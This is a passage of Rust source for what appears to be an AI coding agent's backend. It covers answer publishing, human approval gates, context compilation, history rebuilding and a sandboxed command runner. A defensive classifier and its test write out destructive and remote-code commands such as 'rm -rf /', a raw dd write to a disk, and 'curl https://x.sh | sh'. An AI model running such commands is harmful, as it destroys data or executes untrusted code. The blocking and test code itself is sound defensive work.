    // (F2) Surface the turn's VISIBLE assistant answer on Wire-B - the gap that
    // kept this path opt-in (a client saw driver telemetry but no answer). The
    // kernel streams model output into `agent.observation` payloads rather than the
    // ui_bus, so derive the answer post-hoc from what the run produced (or a
    // synthesized completion summary when the turn produced no model text) and
    // publish it as one coalesced `TokenBatch`, mirroring how `run_turn_core`
    // surfaces its final assistant text.
    let answer = derive_kernel_turn_answer(&event_log, &session_id, &state).await?;
    let stream_id = format!("kernel-{}", run_id.as_str());
    ui_bus.publish_token(seq, Some(session_id.clone()), stream_id, &answer);
    ui_bus.flush(Some(session_id.clone()));

    // (F4) Persist the assistant turn so the NEXT turn's `rebuild_history` sees it
    // (multi-turn continuity, parity with `run_turn_core`'s post-turn persist).
    event_log
        .append(NewEvent::system(
            session_id.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": answer }),
        ))
        .await?;

    // (4) Post-turn publish: the full live `context_manifest` (Spine A) + a `turn`
    // completion patch carrying the terminal phase (mirrors the single-shot post-turn).
    publish_turn_context_manifest(base_url, &ui_bus, &session_id, seq, used_est).await;
    // Task COMPLETION revokes the write lease: the run this lease was granted for has reached a
    // terminal phase, so the authorization it carried is spent. Scoped to THIS run, so a lease held
    // by another task survives.
    if crate::tools::revoke_write_lease_for_run(run_id.as_str(), Some(session_id.as_str())).is_some()
    {
        publish_write_lease(&ui_bus, None, "the task completed");
    }
    ui_bus.publish(UiEvent {
        seq,
        session_id: Some(session_id.clone()),
        kind: UiEventKind::ProjectionPatch {
            projection: "turn".to_string(),
            patch: json!({
                "phase": state.phase.wire_name(),
                "run_id": run_id.as_str(),
            }),
        },
    });

    Ok(state)
}

/// Derive the turn's VISIBLE assistant answer (F2) from what the kernel run
/// produced. The driver streams model output into `agent.observation` payloads
/// (`{"generated": ...}`); the last non-empty one for THIS run is the natural
/// answer. When the run produced no model text (a pure tool/effect turn), we
/// synthesize a concise completion summary from the terminal phase + last verdict
/// - NEVER a model call - so a client always sees a real answer rather than
/// nothing.
async fn derive_kernel_turn_answer(
    event_log: &hide_core::persistence::DynEventLog,
    session_id: &SessionId,
    state: &AgentState,
) -> Result<String> {
    let events = event_log.scan(Some(session_id.clone()), None, None).await?;
    // The driver tags observations with the run's OWN id (`state.run_id`, minted
    // inside `start_run`) - NOT the host-side `run_id` used for interrupts - so we
    // scope to that to read back only THIS run's model output.
    let generated = events
        .iter()
        .filter(|e| e.run_id.as_ref() == Some(&state.run_id) && e.kind == "agent.observation")
        .filter_map(|e| e.payload.get("generated").and_then(|g| g.as_str()))
        .map(|s| s.trim())
        .filter(|s| !s.is_empty())
        .last()
        .map(|s| s.to_string());
    Ok(generated.unwrap_or_else(|| synthesize_completion_summary(state)))
}

/// Non-model completion summary (the F2 fallback): a one-line verdict of what the
/// run did, from its terminal phase + last acceptance verdict. Used only when the
/// run yielded no natural model answer (e.g. a pure edit turn). Deterministic -
/// no model call - so it can never fabricate content.
fn synthesize_completion_summary(state: &AgentState) -> String {
    let phase = state.phase.wire_name();
    match &state.last_verdict {
        Some(v) => {
            let status = format!("{:?}", v.status).to_lowercase();
            let detail = v.detail.trim();
            if detail.is_empty() {
                format!("Turn {phase}: verification {status}.")
            } else {
                format!("Turn {phase}: verification {status} ({detail}).")
            }
        }
        None => format!("Turn {phase}: no verification ran."),
    }
}

/// Surface a paused effectful step awaiting approval: append a durable
/// `approval.requested` event (so a reconnecting client can replay it) AND push a
/// live `Custom` UiEvent on Wire-B (so a connected client sees it now), mirroring
/// how the security gate surfaces a held command. Carries the `run_id` + the
/// pending `step_id` the `approve_effect`/`deny_effect` intent echoes back.
async fn announce_approval_request(
    event_log: &hide_core::persistence::DynEventLog,
    ui_bus: &Arc<UiEventBus>,
    session_id: &SessionId,
    run_id: &RunId,
    request: &ApprovalRequest,
) -> Result<()> {
    let record = event_log
        .append(NewEvent::system(
            session_id.clone(),
            "approval.requested",
            json!({
                "run_id": run_id.as_str(),
                "step_id": request.step_id.as_str(),
                "summary": request.summary,
                "effects": request.effects,
            }),
        ))
        .await?;
    ui_bus.publish(UiEvent {
        seq: record.seq,
        session_id: Some(session_id.clone()),
        // `kind` is the discriminator EVERY other Custom UiEvent uses and the one the
        // frontend router switches on (app/src/store.ts). This event carried `type`,
        // so the only surface that could act on a paused effectful step never saw it
        // and a SuggestOnly turn deadlocked awaiting an approval nobody could give.
        kind: UiEventKind::Custom(json!({
            "kind": "approval_requested",
            "run_id": run_id.as_str(),
            "step_id": request.step_id.as_str(),
            "summary": request.summary,
            "effects": request.effects,
        })),
    });
    Ok(())
}

/// Record how a pending approval was resolved (durable audit): the decision plus
/// the step it applied to. The effect it authorizes (or the skip a deny causes)
/// is recorded by the driver's own `agent.action`/`agent.phase` events.
async fn record_approval_resolved(
    event_log: &hide_core::persistence::DynEventLog,
    session_id: &SessionId,
    run_id: &RunId,
    request: &ApprovalRequest,
    decision: ApprovalDecision,
) -> Result<()> {
    let decision_str = match decision {
        ApprovalDecision::Approve => "approve",
        ApprovalDecision::Deny => "deny",
    };
    event_log
        .append(NewEvent::system(
            session_id.clone(),
            "approval.resolved",
            json!({
                "run_id": run_id.as_str(),
                "step_id": request.step_id.as_str(),
                "decision": decision_str,
            }),
        ))
        .await?;
    Ok(())
}

/// Publish the live `context_manifest` the Context Stack reads (Spine A), read
/// live from the engine's `/v1/hawking/context` - never a constant. Shared by the
/// kernel turn path; a `None` snapshot (serve down / pre-context build) publishes
/// nothing rather than a fake ceiling.
async fn publish_turn_context_manifest(
    base_url: String,
    ui_bus: &Arc<UiEventBus>,
    session_id: &SessionId,
    seq: u64,
    used_est: usize,
) {
    use crate::model_provider::HttpModelProvider;
    let ctx_provider = HttpModelProvider::new(base_url);
    if let Some(info) = ctx_provider.get_context_info().await {
        let ceiling = info.ctx_len_effective.or(info.ctx_len_native).unwrap_or(0);
        let live = build_live_manifest(info.recurrent_state_bytes, info.ctx_len_native, ceiling, used_est);
        let mut live_json = serde_json::to_value(&live).unwrap_or_else(|_| json!({}));
        if let Some(obj) = live_json.as_object_mut() {
            obj.insert("used_tokens_estimate".to_string(), json!(used_est));
            obj.insert("estimated".to_string(), json!(true));
        }
        ui_bus.publish(UiEvent {
            seq,
            session_id: Some(session_id.clone()),
            kind: UiEventKind::ProjectionPatch {
                projection: "context_manifest".to_string(),
                patch: json!({
                    "model_id": info.model_id,
                    "arch": info.arch,
                    "ctx_len_native": info.ctx_len_native,
                    "ctx_len_effective": info.ctx_len_effective,
                    "tq_multiplier": info.tq_multiplier,
                    "tq_estimated": info.tq_estimated,
                    "recurrent_state_bytes": info.recurrent_state_bytes,
                    "active_slots": info.active_slots,
                    "free_slots": info.free_slots,
                    "live": live_json
                }),
            },
        });
    }
}

/// What [`run_turn_core`] returns to its callers: the full completion plus the
/// two bits the live [`generate_submit_turn`] path needs to publish its post-turn
/// `context_manifest` (the stream's seq, and the folded-prompt char length for
/// the used-token estimate).
struct TurnOutcome {
    completion: String,
    stream_seq: u64,
    prompt_chars: usize,
}

/// The SINGLE generation core both entry points funnel through
/// ([`BackendHost::generate_and_publish`] and the spawnable
/// [`generate_submit_turn`]) so the live path and headless tests exercise ONE
/// code path and can never drift.
///
/// It fixes the Phase-1b facade: instead of a raw prompt with an empty history
/// and a hard `max_output_tokens: 256`, it (1) compiles a REAL `ContextPack`
/// from the code index, (2) rebuilds REAL message history from the event log,
/// (3) folds compiled context + history + the user prompt into `prompt` (the
/// native generate route ignores `messages`), (4) derives the output budget from
/// the model window minus what the context consumed, and (5) persists a
/// `context.compiled` marker before streaming and an `agent.message` assistant
/// event after - so the NEXT turn sees this turn in its history.
///
/// `live_ceiling` (the pre-streaming `/v1/hawking/context` snapshot) is `Some`
/// only on the live path; when set, the token sink emits a throttled per-step
/// occupancy patch. `run_id_label` tags the `runtime.generation` event.
#[allow(clippy::too_many_arguments)]
async fn run_turn_core(
    inference: Arc<dyn hawking_orch::inference::InferenceClient>,
    event_log: hide_core::persistence::DynEventLog,
    role_registry: Arc<hawking_orch::RoleRegistry>,
    code_index: Arc<dyn hawking_index::CodeIndex>,
    memory: crate::services::DynMemoryStore,
    ui_bus: Arc<UiEventBus>,
    session_id: SessionId,
    prompt: String,
    live_ceiling: Option<(Option<usize>, Option<usize>, usize)>,
    run_id_label: Option<String>,
    repo_instructions: Arc<crate::compat_instructions::ResolvedInstructions>,
) -> Result<TurnOutcome> {
    use crate::connectors::choose_context_role;
    use hawking_context::compiler::CompileInput;
    use hawking_context::profiles::ContextProfile;
    use hawking_context::sources::CodeIndexContextSource;
    use hawking_context::{ContextCompiler, InMemoryMemoryStore, MemoryKind};
    use hawking_orch::router::SimpleRouter;
    use hide_core::runtime::{InferenceMessage, InferenceRequest, StreamChunk};
    use hide_core::types::Provenance;
    use hide_kernel::runtime_client::KernelRuntimeClient;

    // --- (S3) Compile a REAL ContextPack (bible §4.2). Mirrors the `context`
    // connector so both share one recipe: pick the coding role, size the window
    // to its model, and let the code-index source compete for the budget. ---
    let role = choose_context_role(&role_registry, None)?;
    let max_input = role.model.context_tokens.max(4096);
    let mut compiler = ContextCompiler::new();
    compiler.add_source(CodeIndexContextSource::new(code_index, 16));
    // Bible sec 20 / sec 78.1 #11: fold the repo's resolved Claude Code migration
    // instructions (CLAUDE.md tree + un-scoped rules) into the compiled context as
    // a pinned instruction/system source, honoring precedence (read-last-wins).
    // Added only when the repo actually carries them (an un-migrated repo resolves
    // empty and this is a no-op).
    if !repo_instructions.is_empty() {
        compiler.add_source(repo_instructions.as_source());
    }
    let compiled = compiler
        .compile(CompileInput {
            profile: ContextProfile::coding_default(max_input),
            model: role.model.clone(),
            task: prompt.clone(),
        })
        .await?;
    // Spine B (best-effort): accrue the Project Brain with this compile. A brain
    // write must never fail a turn.
    let brain = InMemoryMemoryStore::record(
        MemoryKind::Project,
        format!(
            "task: {prompt}\nretained {} spans, {} tokens used",
            compiled.manifest.retained.len(),
            compiled.manifest.used_tokens
        ),
        Provenance::trusted("submit_turn.compile"),
    );
    let _ = memory.upsert(brain).await;

    // --- (S2) Rebuild REAL message history from the durable event log, then
    // ensure the current user prompt is the final user message (the live path's
    // `user.intent.submit_turn` is already logged, so it is usually present
    // already; `generate_and_publish` may pass an explicit prompt that is not). ---
    let mut messages = rebuild_history(&event_log, &session_id).await?;
    if messages
        .last()
        .map(|m| m.role != "user" || m.content != prompt)
        .unwrap_or(true)
    {
        messages.push(InferenceMessage {
            role: "user".to_string(),
            content: prompt.clone(),
        });
    }
    let history_block = messages
        .iter()
        .map(|m| format!("{}: {}", m.role, m.content))
        .collect::<Vec<_>>()
        .join("\n");
    // The native `/v1/hawking/generate` route sends only `prompt` (it drops
    // `messages`), so FOLD compiled context + rendered history into `prompt`.
    // `messages` is still populated for a future Chat-route switch.
    let folded_prompt = if compiled.prompt.trim().is_empty() {
        history_block
    } else {
        format!("{}\n\n{}", compiled.prompt, history_block)
    };
    let prompt_chars = folded_prompt.len();

    // --- (S2) Derive the output budget from the window minus what context ate,
    // clamped to a sane band - replacing the hard-coded 256 facade. ---
    let out_budget = max_input
        .saturating_sub(compiled.manifest.used_tokens)
        .clamp(256, 2048);

    // Durable marker: what the compiler retained + the budget it left for output.
    event_log
        .append(NewEvent::system(
            session_id.clone(),
            "context.compiled",
            json!({
                "used_tokens": compiled.manifest.used_tokens,
                "retained": compiled.manifest.retained.len(),
                "budget": out_budget,
            }),
        ))
        .await?;

    // Context receipt: which repo instruction files (CLAUDE.md tree + un-scoped
    // rules) folded into this turn's context, in launch order. Logged only when
    // the repo carried migration instructions.
    if !repo_instructions.is_empty() {
        event_log
            .append(NewEvent::system(
                session_id.clone(),
                "context.instructions",
                repo_instructions.receipt_json(),
            ))
            .await?;
    }

    let request = InferenceRequest {
        task_kind: "code".to_string(),
        prompt: folded_prompt,
        messages,
        max_output_tokens: out_budget,
        sampler: None,
        grammar: None,
        want_logprobs: false,
        metadata: Default::default(),
    };

    // Route through the kernel runtime-client seam (router + inference client).
    let router = Arc::new(SimpleRouter::new(role_registry));
    let runtime = KernelRuntimeClient::new(router, inference);

    // A stable seq to key the published UiEvent stream off of.
    let status_event = event_log
        .append(NewEvent::system(
            session_id.clone(),
            "runtime.generation",
            json!({ "task": "code", "run_id": run_id_label }),
        ))
        .await?;
    let stream_id = status_event.seq.to_string();

    let mut buf = String::new();
    {
        let bus = ui_bus.clone();
        let sess = session_id.clone();
        let sid = stream_id.clone();
        let seq = status_event.seq;
        let mut tok_count = 0usize;
        let mut sink = |chunk: StreamChunk| {
            match chunk {
                StreamChunk::Token { text, .. } => {
                    buf.push_str(&text);
                    bus.publish_token(seq, Some(sess.clone()), &sid, &text);
                    // Throttled per-step occupancy (every 32 tokens), partial patch
                    // - only when the live ceiling was snapshotted (live path).
                    tok_count += 1;
                    if tok_count % 32 == 0 {
                        if let Some((state_bytes, native, ceiling)) = live_ceiling {
                            let used_est = (prompt_chars + buf.len()) / 4;
                            let live = build_live_manifest(state_bytes, native, ceiling, used_est);
                            if let Ok(mut lj) = serde_json::to_value(&live) {
                                if let Some(o) = lj.as_object_mut() {
                                    o.insert("used_tokens_estimate".to_string(), json!(used_est));
                                    o.insert("estimated".to_string(), json!(true));
                                    o.insert("partial".to_string(), json!(true));
                                }
                                bus.publish(UiEvent {
                                    seq,
                                    session_id: Some(sess.clone()),
                                    kind: UiEventKind::ProjectionPatch {
                                        projection: "context_manifest".to_string(),
                                        patch: json!({ "live": lj }),
                                    },
                                });
                            }
                        }
                    }
                }
                StreamChunk::Done { .. } => {
                    bus.flush(Some(sess.clone()));
                }
                StreamChunk::Error { message } => {
                    bus.publish(UiEvent {
                        seq,
                        session_id: Some(sess.clone()),
                        kind: UiEventKind::Error {
                            code: "generation".to_string(),
                            message,
                        },
                    });
                }
            }
            Ok(())
        };
        runtime.generate(request, &mut sink).await?;
    }

    // (S2) Persist the assistant turn so the NEXT turn's `rebuild_history` sees it.
    event_log
        .append(NewEvent::system(
            session_id.clone(),
            "agent.message",
            json!({ "role": "assistant", "text": buf }),
        ))
        .await?;

    Ok(TurnOutcome {
        completion: buf,
        stream_seq: status_event.seq,
        prompt_chars,
    })
}

/// Rebuild the prior conversation as `InferenceMessage`s from the durable event
/// log: a `user.intent.submit_turn` becomes a `user` message (its `args.text`),
/// and an `agent.message` with `role == "assistant"` becomes an `assistant`
/// message (its `text`). Everything else is ignored. Ordered by seq (scan order).
async fn rebuild_history(
    event_log: &hide_core::persistence::DynEventLog,
    session_id: &SessionId,
) -> Result<Vec<hide_core::runtime::InferenceMessage>> {
    use hide_core::runtime::InferenceMessage;
    let events = event_log.scan(Some(session_id.clone()), None, None).await?;
    let mut out = Vec::new();
    for ev in events {
        match ev.kind.as_str() {
            "user.intent.submit_turn" => {
                if let Some(text) = ev
                    .payload
                    .get("args")
                    .and_then(|a| a.get("text"))
                    .and_then(|t| t.as_str())
                {
                    if !text.is_empty() {
                        out.push(InferenceMessage {
                            role: "user".to_string(),
                            content: text.to_string(),
                        });
                    }
                }
            }
            "agent.message" => {
                let role = ev
                    .payload
                    .get("role")
                    .and_then(|r| r.as_str())
                    .unwrap_or("assistant");
                if role == "assistant" {
                    if let Some(text) = ev.payload.get("text").and_then(|t| t.as_str()) {
                        out.push(InferenceMessage {
                            role: "assistant".to_string(),
                            content: text.to_string(),
                        });
                    }
                }
            }
            _ => {}
        }
    }
    Ok(out)
}

/// Spine A (W-F2-1): pick the live-context regime. An SSM (a model reporting a
/// constant recurrent-state footprint) surfaces recall FIDELITY from the
/// calibratable probe; a transformer surfaces KV occupancy. The probe is the
/// swap point for a measured boot-needle curve later.
fn build_live_manifest(
    recurrent_state_bytes: Option<usize>,
    ctx_len_native: Option<usize>,
    ceiling: usize,
    state_age_tokens: usize,
) -> hawking_context::manifest::ManifestLive {
    use hawking_context::fidelity::{LinearFidelity, RecallFidelityProbe};
    use hawking_context::manifest::ManifestLive;
    if let Some(state_bytes) = recurrent_state_bytes {
        let probe = LinearFidelity::new(ctx_len_native.unwrap_or(0));
        let fidelity = probe.fidelity(state_age_tokens);
        ManifestLive::ssm(state_bytes, state_age_tokens, fidelity, ceiling)
    } else {
        ManifestLive::transformer(state_age_tokens, ceiling)
    }
}

#[cfg(test)]
mod live_manifest_tests {
    use super::build_live_manifest;

    #[test]
    fn ssm_regime_carries_recall_fidelity() {
        let ssm = build_live_manifest(Some(6 * 1024 * 1024), Some(1000), 1000, 500);
        assert!(ssm.recall_fidelity.is_some());
        assert!(ssm.state_bytes.is_some());
        assert!(ssm.kv_seq_len.is_none());
        // Half the horizon -> ~0.5 fidelity -> ~0.5 occupancy (1 - fidelity).
        assert!(
            (ssm.occupancy - 0.5).abs() < 0.05,
            "occupancy {}",
            ssm.occupancy
        );
    }

    #[test]
    fn transformer_regime_has_no_fidelity() {
        let tf = build_live_manifest(None, Some(4096), 4096, 1024);
        assert!(tf.recall_fidelity.is_none());
        assert!(tf.kv_seq_len.is_some());
    }
}

/// What is parked at the security gate awaiting an `approve_gate` / `deny_gate` decision.
#[derive(Debug, Clone, PartialEq)]
enum PendingAction {
    /// A terminal command classified dangerous. Runs SANDBOX-confined on release.
    Command {
        argv: Vec<String>,
        cwd: Option<String>,
    },
    /// A custom intent whose `CommandSpec` declares `ApprovalPolicy::Ask`. Recorded in the
    /// event log already; its EFFECT runs only once released.
    Intent { name: String, payload: Value },
}

/// A bounded book of commands parked at the security gate, keyed by gate id. Bounded so a never-
/// answered gate cannot leak unboundedly: past `CAP` the book REFUSES to park anything more, and
/// the caller is told its action was not held. It used to evict the oldest entry, which silently
/// dropped a pending approval on the floor and turned a later approve of it into a no-op the
/// frontend read as success. Human-approved gates are rare, so a small `Vec` under a `Mutex` is
/// ample. Gate ids are `command:<n>` (monotonic), unique so concurrent gates never collide.
#[derive(Default)]
struct GateBook {
    inner: std::sync::Mutex<Vec<(String, PendingAction)>>,
}

impl GateBook {
    const CAP: usize = 32;

    /// Park an action and return its fresh gate id, or `None` when `CAP` decisions are already
    /// outstanding (fail closed: nothing is parked, so nothing is silently lost).
    fn hold(&self, action: PendingAction) -> Option<String> {
        use std::sync::atomic::{AtomicU64, Ordering};
        static GATE_SEQ: AtomicU64 = AtomicU64::new(1);
        let mut g = self.inner.lock().unwrap();
        if g.len() >= Self::CAP {
            return None;
        }
        let gate = format!("command:{}", GATE_SEQ.fetch_add(1, Ordering::Relaxed));
        g.push((gate.clone(), action));
        Some(gate)
    }

    /// Remove and return the action parked under `gate` (approve path). `None` if unknown.
    fn take(&self, gate: &str) -> Option<PendingAction> {
        let mut g = self.inner.lock().unwrap();
        g.iter().position(|(k, _)| k == gate).map(|i| g.remove(i).1)
    }

    /// Drop the command parked under `gate` (deny path). Returns whether one was parked.
    fn remove(&self, gate: &str) -> bool {
        let mut g = self.inner.lock().unwrap();
        match g.iter().position(|(k, _)| k == gate) {
            Some(i) => {
                g.remove(i);
                true
            }
            None => false,
        }
    }

    #[cfg(test)]
    fn len(&self) -> usize {
        self.inner.lock().unwrap().len()
    }
}

/// Classify a command as genuinely destructive / system-level. Returns `Some(reason)` to block, `None`
/// to allow. Conservative: ordinary dev commands (build, test, git, `rm -rf node_modules`) pass; only
/// privilege escalation, filesystem destroyers, recursive deletes of a system/home path, remote code
/// piped into a shell, and fork bombs are caught.
fn dangerous_command(argv: &[String]) -> Option<&'static str> {
    let prog = argv.first().map(|s| s.as_str()).unwrap_or("");
    let j = argv.join(" ").to_lowercase();
    if prog == "sudo" || prog == "doas" {
        return Some("runs as administrator");
    }
    if prog == "mkfs" || j.contains("mkfs.") {
        return Some("formats a filesystem");
    }
    if prog == "dd" && j.contains("of=/dev/") {
        return Some("writes raw to a device");
    }
    if prog == "rm"
        && (j.contains("-rf") || j.contains("-fr") || (j.contains("-r") && j.contains("-f")))
    {
        if j.contains(" /") || j.contains(" ~") || j.contains(" /*") {
            return Some("recursively deletes a system path");
        }
    }
    if (j.contains("curl ") || j.contains("wget "))
        && (j.contains("| sh") || j.contains("|sh") || j.contains("| bash") || j.contains("|bash"))
    {
        return Some("pipes a remote script into a shell");
    }
    if j.contains(":(){") || j.contains(":|:&") {
        return Some("fork bomb");
    }
    if (prog == "chmod" || prog == "chown")
        && j.contains("-r")
        && (j.contains(" /") || j.contains(" ~"))
    {
        return Some("recursively changes permissions on a system path");
    }
    None
}

// Run a command in the workspace and stream stdout/stderr back as tool_progress (the terminal renders
// them). Confined to the workspace root. A real command runner, not a full interactive PTY. The
// security gate is applied UPSTREAM (in `spawn_command_run`), so reaching here means the command is
// either inherently safe or was user-approved via the gate round-trip.
async fn exec_command_streamed(
    ui_bus: Arc<UiEventBus>,
    root: PathBuf,
    argv: Vec<String>,
    cwd: Option<String>,
) {
    use std::sync::atomic::{AtomicU64, Ordering};
    use tokio::io::AsyncBufReadExt;
    static SHELL_SEQ: AtomicU64 = AtomicU64::new(1);
    let call_id = format!("shell:{}", SHELL_SEQ.fetch_add(1, Ordering::Relaxed));
    let line = |bus: &Arc<UiEventBus>, message: String| {
        bus.publish(UiEvent {
            seq: 0,
            session_id: None,
            kind: UiEventKind::ToolProgress {
                call_id: call_id.clone(),
                message,
                event_id: None,
            },
        });
    };

    // Confine the cwd to the workspace root (reject any escape).
    let dir = match &cwd {
        Some(c) if !c.contains("..") => root.join(c.trim_start_matches('/')),
        _ => root.clone(),
    };

    let mut command = tokio::process::Command::new(&argv[0]);
    command
        .args(&argv[1..])
        .current_dir(&dir)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());

    let mut child = match command.spawn() {
        Ok(c) => c,
        Err(e) => {
            line(&ui_bus, format!("{}: {}", argv[0], e));
            return;
        }
    };

    let mut readers = Vec::new();
    if let Some(out) = child.stdout.take() {
        let bus = ui_bus.clone();
        let cid = call_id.clone();
        readers.push(tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(out).lines();
            while let Ok(Some(l)) = lines.next_line().await {
                bus.publish(UiEvent {
                    seq: 0,
                    session_id: None,
                    kind: UiEventKind::ToolProgress {
                        call_id: cid.clone(),
                        message: l,
                        event_id: None,
                    },
                });
            }
        }));
    }
    if let Some(err) = child.stderr.take() {
        let bus = ui_bus.clone();
        let cid = call_id.clone();
        readers.push(tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(err).lines();
            while let Ok(Some(l)) = lines.next_line().await {
                bus.publish(UiEvent {
                    seq: 0,
                    session_id: None,
                    kind: UiEventKind::ToolProgress {
                        call_id: cid.clone(),
                        message: l,
                        event_id: None,
                    },
                });
            }
        }));
    }
    let status = child.wait().await;
    for r in readers {
        let _ = r.await;
    }
    match status {
        Ok(s) if s.success() => line(&ui_bus, "exit 0".to_string()),
        Ok(s) => line(&ui_bus, format!("exit {}", s.code().unwrap_or(-1))),
        Err(e) => line(&ui_bus, format!("wait failed: {e}")),
    }
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct BackendStatus {
    pub workspace_root: PathBuf,
    pub capabilities: BackendCapabilities,
    pub connectors: Vec<ConnectorStatus>,
    pub tools: Vec<ToolSpec>,
    pub model_roles: Vec<ModelRole>,
    /// The supervised runtime's state, or `None` when no model is configured
    /// (`HIDE_MODEL_WEIGHTS` unset). Lets the FE reflect down/booting/ready/
    /// degraded/failed.
    #[serde(default)]
    pub runtime: Option<RuntimeSupervisorState>,
}

fn tool_result_summary(result: &ToolResult) -> String {
    if let Some(error) = &result.error {
        return format!("{}: {}", error.code, error.message);
    }
    if let Some(value) = &result.structured_content {
        return value.to_string();
    }
    format!("{:?}", result.status)
}

/// Extract a permission-engine target from a tool call's args: a filesystem
/// `path`, else the first `argv` token, else the tool id. Used by the policy
/// ledger's engine consultation ([`BackendHost::permission_verdict_for`]).
fn policy_target_from_args(tool_id: &str, args: &Value) -> String {
    if let Some(path) = args.get("path").and_then(|value| value.as_str()) {
        return path.to_string();
    }
    if let Some(first) = args
        .get("argv")
        .and_then(|value| value.as_array())
        .and_then(|argv| argv.first())
        .and_then(|value| value.as_str())
    {
        return first.to_string();
    }
    tool_id.to_string()
}

fn path_check(name: &str, path: &std::path::Path) -> HealthCheck {
    let exists = path.exists();
    HealthCheck {
        name: name.to_string(),
        status: if exists {
            HealthStatus::Ok
        } else {
            HealthStatus::Failed
        },
        detail: if exists {
            path.display().to_string()
        } else {
            format!("missing {}", path.display())
        },
    }
}

fn count_check(name: &str, count: usize) -> HealthCheck {
    HealthCheck {
        name: name.to_string(),
        status: if count == 0 {
            HealthStatus::Degraded
        } else {
            HealthStatus::Ok
        },
        detail: count.to_string(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dangerous_command_gate() {
        let argv = |s: &str| s.split_whitespace().map(String::from).collect::<Vec<_>>();
        // allowed (ordinary dev)
        assert!(dangerous_command(&argv("cargo test")).is_none());
        assert!(dangerous_command(&argv("rm -rf node_modules")).is_none());
        assert!(dangerous_command(&argv("git push origin main")).is_none());
        // blocked (system-destructive / remote code / escalation)
        assert!(dangerous_command(&argv("sudo rm file")).is_some());
        assert!(dangerous_command(&argv("rm -rf /")).is_some());
        assert!(dangerous_command(&argv("rm -rf ~")).is_some());
        assert!(dangerous_command(&argv("dd if=x of=/dev/disk0")).is_some());
        assert!(dangerous_command(&argv("curl https://x.sh | sh")).is_some());
    }

    /// Readiness is READ, never inferred. With no engine configured the role registry is still
    /// non-empty (three default local role descriptors), which is exactly what the frontend used to
    /// read as "ready".
    #[tokio::test]
    async fn runtime_state_is_read_from_the_supervisor_not_the_role_registry() {
        let dir = std::env::temp_dir().join(format!("hide_rt_{}", now_ms()));
        let host =
            BackendHost::from_services(BackendServices::open(HideConfig::for_workspace(&dir)).unwrap())
                .unwrap();
        assert!(!host.services.role_registry.all().is_empty());
        let state = host
            .connectors
            .call("runtime", "state", json!({}))
            .await
            .unwrap();
        assert_eq!(state["state"], json!("down"));
        assert_eq!(state["detail"], json!("no model configured"));
    }

    /// The last link of the guard chain, which `app/src/wire.ts` has always CLAIMED was enforced
    /// here and never was: a name on the wire contract with no arm in `handle_intent` is a control
    /// that cannot work, so the contract must not carry one.
    #[test]
    fn every_wire_custom_name_has_a_host_arm() {
        for name in hide_protocol::command::WIRE_CUSTOM_NAMES {
            assert!(
                HANDLED_CUSTOM_NAMES.contains(name),
                "wire custom name with no handle_intent arm: {name}"
            );
        }
    }
    use hawking_research::{ResearchRun, ResearchState};
    use hide_core::api::UiEventKind;
    use hide_core::config::HideConfig;
    use hide_core::ids::now_ms;
    use hide_core::tool::ToolCall;
    use hide_core::types::Decision;

    #[tokio::test]
    async fn host_dispatches_tool_and_records_events() {
        let dir = std::env::temp_dir().join(format!("hide_host_{}", now_ms()));
        let mut config = HideConfig::for_workspace(&dir);
        config.security.workspace_write_default = Decision::Allow;
        let host = BackendHost::from_services(BackendServices::open(config).unwrap()).unwrap();
        let session_id = host.services.session();
        let file = dir.join("host.txt");

        let result = host
            .dispatch_tool(
                session_id.clone(),
                None,
                ToolCall::new(
                    "fs.write",
                    json!({
                        "path": file.to_string_lossy(),
                        "content": "host write",
                        "create_dirs": true
                    }),
                ),
            )
            .await
            .unwrap();

        assert_eq!(result.status, ToolStatus::Ok);
        assert_eq!(std::fs::read_to_string(&file).unwrap(), "host write");
        let events = host
            .services
            .event_log
            .scan(Some(session_id.clone()), None, None)
            .await
            .unwrap();
        assert!(events.iter().any(|event| event.kind == "tool.call"));
        assert!(events.iter().any(|event| event.kind == "tool.result"));
        assert!(host
            .services
            .projection_store
            .latest_projection(&session_id)
            .unwrap()
            .is_some());
        let ui_events = host
            .ui_events(Some(session_id.clone()), None, None)
            .await
            .unwrap();
        assert!(ui_events
            .iter()
            .any(|event| matches!(event.kind, UiEventKind::ToolProgress { .. })));
        let rebuilt = host
            .rebuild_session_projection(session_id.clone())
            .await
            .unwrap();
        assert_eq!(rebuilt.session_id, session_id);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[tokio::test]
    async fn policy_ledger_classifies_and_durably_records_decisions() {
        let dir = std::env::temp_dir().join(format!("hide_policy_{}", now_ms()));
        let host = BackendHost::open_workspace(&dir).unwrap();
        let session = host.services.session();

        // read tool -> Allow, no sandbox.
        let read = host
            .evaluate_tool_policy(
                &session,
                "fs.read",
                &json!({ "path": dir.join("a.txt").to_string_lossy() }),
            )
            .await
            .unwrap();
        assert_eq!(read, PolicyDecision::Allow);
        assert!(!read.requires_sandbox());

        // exec tool -> RequireSandbox.
        let run = host
            .evaluate_tool_policy(&session, "shell.run", &json!({ "argv": ["ls"] }))
            .await
            .unwrap();
        assert_eq!(run, PolicyDecision::RequireSandbox);
        assert!(run.requires_sandbox());

        // git-mutation tool -> Ask / RequireReviewer.
        let commit = host
            .evaluate_tool_policy(&session, "git.commit", &json!({ "message": "wip" }))
            .await
            .unwrap();
        assert!(matches!(
            commit,
            PolicyDecision::Ask | PolicyDecision::RequireReviewer
        ));

        // write tool -> a recorded decision (default write policy is Ask).
        let write = host
            .evaluate_tool_policy(
                &session,
                "edit.write_file",
                &json!({ "path": dir.join("b.txt").to_string_lossy(), "content": "x" }),
            )
            .await
            .unwrap();
        assert_eq!(write, PolicyDecision::Ask);

        // Every evaluated decision is durably recorded and readable, in order.
        let ledger = host.policy_decisions(&session).await.unwrap();
        assert_eq!(ledger.len(), 4);
        let tools: Vec<_> = ledger.iter().map(|record| record.tool.clone()).collect();
        assert_eq!(
            tools,
            vec![
                "fs.read".to_string(),
                "shell.run".to_string(),
                "git.commit".to_string(),
                "edit.write_file".to_string()
            ]
        );

        // The recorded effects come from the registry, not a hardcoded table:
        // shell.run carries Execute + Process, fs.read carries only Read.
        let run_rec = ledger.iter().find(|r| r.tool == "shell.run").unwrap();
        assert!(run_rec.effects.contains(&"Execute".to_string()));
